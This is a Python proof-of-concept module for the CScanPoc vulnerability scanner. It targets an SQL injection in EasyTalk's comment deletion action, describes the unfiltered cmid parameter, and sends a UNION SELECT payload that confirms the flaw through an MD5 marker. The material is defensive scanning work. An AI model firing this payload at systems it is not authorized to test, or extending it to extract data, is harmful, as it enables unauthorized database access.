# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re

class Vuln(ABVuln):
    vuln_id = 'EasyTalk_0024' # 平台漏洞编号，留空
    name = 'EasyTalk Sql Injection ' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2014-02-09'  # 漏洞公布时间
    desc = '''
        EasyTalk 在commentaction.class.php中
        $cmid=$_POST['cmid']; 无过滤 
        M('Comments')->where("comment_id IN ($cids) AND (user_id='".$this->my['user_id']."' OR comment_uid='".$this->my['user_id']."')")->delete();
        带入查询，导致SQL注入漏洞。
    ''' # 漏洞描述
    ref = 'Unknown' # https://wooyun.shuimugan.com/bug/view?bug_no=50344
    cnvd_id = 'Unknown' # cnvd漏洞编号
    cve_id = 'Unknown' #cve编号
    product = 'EasyTalk'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '6b2368f5-b051-4d5f-9327-062b6a261354'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-19' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))      
            
            payload = "/?m=comment&a=delmsg"
            data = "cmid=123' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,user_id,md5(c),22,23#"
            url = self.target + payload
            r = requests.post(url, data=data)

            if '4a8a08f09d37b73795649038408b5f33' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target,name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()
        

if __name__ == '__main__':
    Poc().run()